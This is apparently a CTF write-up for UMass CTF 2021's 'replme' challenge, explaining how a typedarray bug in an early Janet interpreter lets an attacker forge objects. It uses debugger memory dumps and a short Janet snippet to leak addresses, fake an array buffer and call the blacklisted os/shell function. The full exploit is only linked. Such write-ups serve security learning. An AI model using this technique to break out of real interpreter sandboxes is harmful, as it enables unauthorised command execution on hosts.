---
layout: post
title: UMass CTF 2021 - replme [pwn]
author: rick2600
tags: [pwn, interpreter, janet]
---

 * Competition: [UMass CTF 2021](https://ctf.umasscybersec.org/)
 * Challenge Name: replme
 * Type: pwn
 * Points: 500 pts
 * Description: 
 > Description: I found this new programming language and wanted people to be able to try it out. http://34.72.244.178:8085


I didn't play the CTF, but the `replme` task caught my attention. The challenge was about exploiting the interpreter for the [Janet Language](https://janet-lang.org/). As I like interpreters and had written some exploits for other interpreters in the past, I decided to take a look at this task after the CTF ended.

Running the interpreter reveals the version.

```
./janet 
Janet 1.1.0-dev-6887dd05  Copyright (C) 2017-2019 Calvin Rose
janet:0:> 

```
<!--more-->
## Recon

```
./janet: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped

Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✓ 
RelRO                         : Partial
```

## Vulnerability

Looking for known vulnerabilites affecting this version, I found an [issue](https://github.com/janet-lang/janet/issues/142) related to "**typedarray allowing to create arbitrary objects**". The interpreter uses the technique called "NaN Boxing" to represent the objects.

### Key concepts

* **NaN Boxing** - is a technique that uses properties of a IEEE754 standard to represent several values/objects
* **TypedArray** - array-like objects that provide a mechanism for reading and writing raw binary data to memory buffers
* **Buffer** -  a buffer is an object representing a chunk of data; it is a data type that is used to represent a generic, fixed-length binary data buffer
* **View** - a low-level interface that provides a getter/setter API to read and write arbitrary data to the buffer

You can read more about these concepts [here](https://craftinginterpreters.com/optimization.html#nan-boxing) and [here](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays).

### PoC

From the PoC we see an artificial **cfunction** being created and executed. We can forge the address to be executed as a **cfunction**, but how can we abuse it to execute **system(cmd)** or a related function if we have no idea where these functions are in memory? It is worth mentioning that there's a **os/shell** function but the challenge blacklists it. So we need to find a way to execute it.

## Leak

The first thing I thought was to try to leak the address of any **cfunction** directly, for example **print (cfun\_io\_print)** and calculate the offset to **os/shell (os_shell)**. I didn't find an easy way to do this (to be honest I didn't investigate much, neither from experiments nor from janet documentation). But from my experiments I saw that if I tried to execute an array as function I could get its address. I used this approach to leak things.

```
janet:0:> (var array @[])
@[]
janet:16:> (array)
error: <array 0x5555555E30A0> called with arity 0, expected 1
  in _thunk [repl] (tailcall) at (17:23)

```

The language has a **try** function that helps to get this error as string. I wrote a function to convert a hex string to number. Again... I didn't investigate much the documentation to see if I could use a builtin function to make this conversion, but it was fun to play a bit with the syntax anyway ;).

So... My idea was...

1. Create an array and insert print into it
2. Leak the array address
3. Forge an object using the bug that allowed me to read raw content of this array or adjacent memory

I could try to forge an **array buffer (tarray/buffer)** using **&array+n** and create a view to read data from this array buffer.

Let's see how a regular array and an array buffer is represented in memory.

### Code

```lisp
(var buffer (tarray/buffer 16))
(var view  (tarray/new :uint32  4 1 0 buffer))

(set (view 0) 0x11111111) 
(set (view 1) 0x22222222) 
(set (view 2) 0x33333333) 
(set (view 3) 0x44444444) 

(var array @[print buffer])
```

### Memory
```
# array address
gef➤  x/4gx 0x555555621110
0x555555621110:	0x00007fff00000003	0x00005555556209d0
0x555555621120:	0x0000000200000002	0x0000555555621140

# array data
gef➤  x/4gx 0x0000555555621140
0x555555621140:	0xfffed5555556f210	0xffff5555555c3530
0x555555621150:	0x0000046c00000452	0x0000000000000041

# array[0] is &cfun_io_print
gef➤  print &cfun_io_print
$4 = (<text variable, no debug info> *) 0x55555556f210 <cfun_io_print>

# array[1] is &buffer
gef➤  x/4gx 0xffff5555555c3530 & 0x7fffffffffff
0x5555555c3530:	0x00005555555ee120	0x0000000000000010
0x5555555c3540:	0xfff8800000000000	0x0000000000000031

# buffer data
gef➤  x/4wx 0x00005555555ee120
0x5555555ee120:	0x11111111	0x22222222	0x33333333	0x44444444
```

So... To forge an useful fake array buffer for our goal, we need:

1. An address relative to &array
2. This address must point to [another address, size]
3. We need to properly encode it as NaN Boxed (ex.: `0x00005555555ee120` to `0xffff5555555c3530`)]

The **&array+0x18** seems to be perfect.
```
gef➤  x/2gx 0x555555621110 + 0x18
0x555555621128:	0x0000555555621140	0x0000046c00000452
gef➤  x/2gx 0x0000555555621140
0x555555621140:	0xfffed5555556f210	0xffff5555555c3530
```

Forging this address as an array buffer and attaching an uint32 view to it allows us to know where **cfun_io_print** is in memory and consequently **os_shell**.

## Exploit

1. Create an array and insert **print** in it
2. Use this array to trigger an exception
3. Get array address from the exception
4. Forge a fake array buffer to read raw data from the array
5. Get the address of **cfun_io_print** and calculate offset to **os_shell**
6. Forge **c_function** to call **os_shell**
7. Pwn

Full exploit [here](https://gist.github.com/rick2600/f92999a06dd4bf45832ba4633f6a6e87).

This exploit works for both `replme` (16 solves) and `replem2` (4 solves)

![replme](https://user-images.githubusercontent.com/2582199/112950609-da208280-9110-11eb-8452-4dee6e32152a.png)

![replme2](https://user-images.githubusercontent.com/2582199/112950630-e0166380-9110-11eb-85cb-33a9e4bb320a.png)



